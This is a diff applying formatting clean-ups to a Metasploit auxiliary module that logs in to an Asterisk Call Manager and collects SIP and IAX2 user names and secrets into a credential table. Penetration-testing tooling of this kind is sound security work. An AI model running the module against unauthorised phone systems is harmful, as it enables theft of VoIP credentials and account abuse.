@@ -8,21 +8,24 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Asterisk Gather Credentials',
-      'Description' => %q{
-        This module retrieves SIP and IAX2 user extensions and credentials from
-        Asterisk Call Manager service. Valid manager credentials are required.
-      },
-      'Author'      => 'bcoles',
-      'References'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Asterisk Gather Credentials',
+        'Description' => %q{
+          This module retrieves SIP and IAX2 user extensions and credentials from
+          Asterisk Call Manager service. Valid manager credentials are required.
+        },
+        'Author' => 'bcoles',
+        'References' => [
           ['URL', 'http://www.asterisk.name/sip1.html'],
           ['URL', 'http://www.asterisk.name/iax2.html'],
           ['URL', 'https://www.voip-info.org/wiki/view/Asterisk+manager+API'],
           ['URL', 'https://www.voip-info.org/wiki-Asterisk+CLI']
         ],
-      'License'     => MSF_LICENSE))
+        'License' => MSF_LICENSE
+      )
+    )
     register_options [
       Opt::RPORT(5038),
       OptString.new('USERNAME', [true, 'The username for Asterisk Call Manager', 'admin']),
@@ -36,11 +39,11 @@ class MetasploitModule < Msf::Auxiliary
     connect
     banner = sock.get_once
 
-    unless banner =~ %r{Asterisk Call Manager/([\d\.]+)}
+    unless banner =~ %r{Asterisk Call Manager/([\d.]+)}
       fail_with Failure::BadConfig, 'Asterisk Call Manager does not appear to be running'
     end
 
-    print_status "Found Asterisk Call Manager version #{$1}"
+    print_status "Found Asterisk Call Manager version #{::Regexp.last_match(1)}"
 
     unless login
       fail_with Failure::NoAccess, 'Authentication failed'
@@ -59,17 +62,19 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status "Found #{@users.length} users"
 
-    cred_table = Rex::Text::Table.new 'Header'  => 'Asterisk User Credentials',
-                                      'Indent'  => 1,
+    cred_table = Rex::Text::Table.new 'Header' => 'Asterisk User Credentials',
+                                      'Indent' => 1,
                                       'Columns' => ['Username', 'Secret', 'Type']
 
     @users.each do |user|
-      cred_table << [ user['username'],
-                      user['password'],
-                      user['type'] ]
-      report_cred user:     user['username'],
+      cred_table << [
+        user['username'],
+        user['password'],
+        user['type']
+      ]
+      report_cred user: user['username'],
                   password: user['password'],
-                  proof:    "#{user['type']} show users"
+                  proof: "#{user['type']} show users"
     end
 
     print_line
@@ -100,25 +105,25 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_cred(opts)
     service_data = {
-      address:      rhost,
-      port:         rport,
+      address: rhost,
+      port: rport,
       service_name: 'asterisk_manager',
-      protocol:     'tcp',
+      protocol: 'tcp',
       workspace_id: myworkspace_id
     }
 
     credential_data = {
-      origin_type:     :service,
+      origin_type: :service,
       module_fullname: fullname,
-      username:        opts[:user],
-      private_data:    opts[:password],
-      private_type:    :password
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
     }.merge service_data
 
     login_data = {
-      core:              create_credential(credential_data),
-      status:            Metasploit::Model::Login::Status::UNTRIED,
-      proof:             opts[:proof]
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
     }.merge service_data
 
     create_credential_login login_data
@@ -136,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
     res
   rescue Timeout::Error
     print_error "Timeout (#{timeout} seconds)"
-  rescue => e
+  rescue StandardError => e
     print_error e.message
   end
 
@@ -152,14 +157,14 @@ class MetasploitModule < Msf::Auxiliary
 
     return false unless res =~ /Response: Success/
 
-    report_cred user:     username,
+    report_cred user: username,
                 password: password,
-                proof:    'Response: Success'
+                proof: 'Response: Success'
 
-    report_service :host  => rhost,
-                   :port  => rport,
-                   :proto => 'tcp',
-                   :name  => 'asterisk'
+    report_service host: rhost,
+                   port: rport,
+                   proto: 'tcp',
+                   name: 'asterisk'
     true
   end
 
@@ -185,8 +190,8 @@ class MetasploitModule < Msf::Auxiliary
     # We're only interested in the first two columns: username and secret
     # To parse the table, we need the character width of these two columns
     if res =~ /^(Username\s+)(Secret\s+)/
-      user_len = $1.length
-      pass_len = $2.length
+      user_len = ::Regexp.last_match(1).length
+      pass_len = ::Regexp.last_match(2).length
     else
       print_error "'#{type} show users' is not supported"
       return
